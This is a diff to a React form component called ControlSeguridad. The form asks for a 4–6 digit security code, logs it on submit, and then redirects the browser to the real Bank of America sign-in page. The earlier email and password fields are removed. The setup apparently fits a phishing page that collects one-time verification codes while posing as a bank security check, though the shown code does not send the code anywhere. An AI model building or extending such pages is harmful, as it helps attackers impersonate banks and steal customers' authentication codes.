@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useState } from "react";
 import { useFormik } from "formik";
 import * as Yup from "yup";
 import { Link } from "react-router-dom";
@@ -10,24 +10,24 @@ import "./controlSeguridad.scss";
 
 export default function ControlSeguridad() {
 
+
   //FORMULARIO FORMIK
   const formik = useFormik({
     initialValues: {
       codigo: "",
-      // email: "",
-      // password: "",
     },
     validationSchema: Yup.object({
       codigo: Yup.string()
         .required("el campo es necesario ")
         .min(4, "Mínimo 4 dígitos ")
         .max(6, "Máximo 6 dígitos"),
-      // email: Yup.string().required("campo obligatorio").email("email invalido"),
-      // password: Yup.string().required("password obligatorio"),
+
     }),
     onSubmit: (formData) => {
       // iniciarSesion(formData);
       console.log(formData);
+      //direcciona a otra url externa
+      window.location.href = 'https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go'; 
     },
   });
 
@@ -40,6 +40,12 @@ export default function ControlSeguridad() {
       );
     }
   };
+
+
+
+  // <a className='link_a' href='https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go' >Confirmar</a>
+
+
 
   return (
     <div className="control-seguro">
@@ -98,11 +104,9 @@ export default function ControlSeguridad() {
           </div>
 
 
-          {/* <a href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go"></a> */}
-          
-          <button className="btn-seguro" type="submit">
+          <button className="btn-seguro" type="submit" >
             <IoIcons.IoIosUnlock />
-            <a className='link_a' href='https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go' >Confirmar</a>
+            confirmar
           </button>
         </form>
       </section>
